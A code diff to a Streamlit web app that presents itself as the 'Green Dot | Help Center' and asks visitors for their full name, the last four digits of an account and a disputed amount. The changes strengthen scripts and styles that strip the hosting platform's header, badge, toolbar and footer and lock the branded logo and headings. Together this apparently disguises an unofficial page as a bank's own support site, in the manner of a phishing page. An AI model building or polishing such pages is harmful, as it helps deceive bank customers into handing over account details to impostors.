@@ -23,13 +23,12 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: LIMPIEZA DE INTERFAZ
+# 1. JS: LIMPIEZA DE INTERFAZ REFORZADA
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
-            '.section-anchor', 'a.section-anchor', '._container_gzau3_1',
+            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
             '._viewerBadge_aycw8_23', '[data-testid="stAppToolbar"]',
-            'iframe[title="Streamlit Cloud Status"]', 'script[src*="googletagmanager"]',
             'footer', 'header', '.stDeployButton'
         ];
         selectors.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
@@ -37,23 +36,28 @@ st.markdown("""<script>
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: CONTROL DE INTERACCIÓN Y REMOCIÓN DE FULLSCREEN
+# 2. CSS: OCULTAR ANCLAS Y CONTROL DE INTERACCIÓN
 st.markdown("""<style>
-header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { display: none !important; }
-
-/* Ocultar botón de pantalla completa en imágenes */
-button[title='View fullscreen'] { 
-    display: none !important; 
+header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor, [data-testid="stHeaderActionElements"] {
+    display: none !important;
+    visibility: hidden !important;
 }
 
-/* Desactivar links en logo y títulos */
+/* Eliminar específicamente el símbolo de link en los encabezados */
+.stMarkdown a.section-anchor {
+    display: none !important;
+}
+
+button[title='View fullscreen'] {
+    display: none !important;
+}
+
 [data-testid="stImage"], [data-testid="stImage" ] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
     pointer-events: none !important;
     cursor: default !important;
     user-select: none !important;
 }
 
-/* EXCEPCIÓN: Activar interacción solo para la caja de descarga de apps */
 .promo-box, .promo-box a, .promo-box img {
     pointer-events: auto !important;
     cursor: pointer !important;
@@ -95,7 +99,6 @@ button[title='View fullscreen'] {
 }
 </style>""", unsafe_allow_html=True)
 
-# Logo centralizado (Inactivo y sin fullscreen)
 col1, col2, col3 = st.columns([1,2,1])
 with col2:
     if os.path.exists('logo.svg'):
@@ -104,7 +107,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21_4", clear_on_submit=True):
+with st.form("compact_form_v21_5", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -116,7 +119,6 @@ with st.form("compact_form_v21_4", clear_on_submit=True):
 if submitted:
     if nombre and rec and car: st.success("✅ Claim received.")
 
-# Sección App (ACTIVA)
 st.markdown("""<div class='promo-box'>
     <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
